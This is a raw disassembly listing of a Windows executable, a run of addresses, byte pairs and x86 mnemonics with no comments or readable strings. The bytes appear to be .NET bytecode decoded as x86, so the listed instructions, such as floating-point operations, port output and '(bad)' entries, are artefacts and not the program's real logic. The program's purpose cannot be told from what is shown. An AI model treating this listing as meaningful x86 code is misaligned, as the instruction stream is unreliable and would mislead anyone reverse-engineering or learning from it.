  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 4c             	or     0x4c(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 52                	jb     0x403e13
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 b2                	jb     0x403d84
  403dd2:	25 00 70 28 25       	and    $0x25287000,%eax
  403dd7:	00 00                	add    %al,(%eax)
  403dd9:	0a 3a                	or     (%edx),%bh
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 bc                	jb     0x403d9e
  403de2:	25 00 70 28 25       	and    $0x25287000,%eax
  403de7:	00 00                	add    %al,(%eax)
  403de9:	0a 3a                	or     (%edx),%bh
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 ca                	jb     0x403dbc
  403df2:	25 00 70 28 25       	and    $0x25287000,%eax
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 3a                	or     (%edx),%bh
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 52 21 00       	and    $0x215272,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 b2                	jb     0x403dce
  403e1c:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e21:	00 00                	add    %al,(%eax)
  403e23:	06                   	push   %es
  403e24:	25 72 6a 21 00       	and    $0x216a72,%eax
  403e29:	70 6f                	jo     0x403e9a
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 e0                	jb     0x403e33
  403e53:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403e58:	00 00                	add    %al,(%eax)
  403e5a:	06                   	push   %es
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 52 21 00       	and    $0x215272,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 e8                	jb     0x403e6f
  403e87:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e8c:	00 00                	add    %al,(%eax)
  403e8e:	06                   	push   %es
  403e8f:	25 72 fe 25 00       	and    $0x25fe72,%eax
  403e94:	70 6f                	jo     0x403f05
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 e0                	jb     0x403e7d
  403e9d:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ea2:	00 00                	add    %al,(%eax)
  403ea4:	06                   	push   %es
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 0c                	jb     0x403ee7
  403edb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 e0                	jb     0x403ecb
  403eeb:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403ef0:	00 00                	add    %al,(%eax)
  403ef2:	06                   	push   %es
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 e0             	or     %esi,-0x20(%edx)
  403f1e:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403f23:	00 00                	add    %al,(%eax)
  403f25:	06                   	push   %es
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 0c                	jb     0x403f3a
  403f2e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 e0                	jb     0x403fc8
  403fe8:	25 00 70 6f 7f       	and    $0x7f6f7000,%eax
  403fed:	00 00                	add    %al,(%eax)
  403fef:	06                   	push   %es
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 16             	or     0x16(%edx),%dh
  404006:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 32             	add    %dh,0x32(%edx)
  404025:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 3a                	jb     0x4040ff
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 68                	jb     0x40417b
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 b0             	add    %dh,-0x50(%edx)
  404180:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
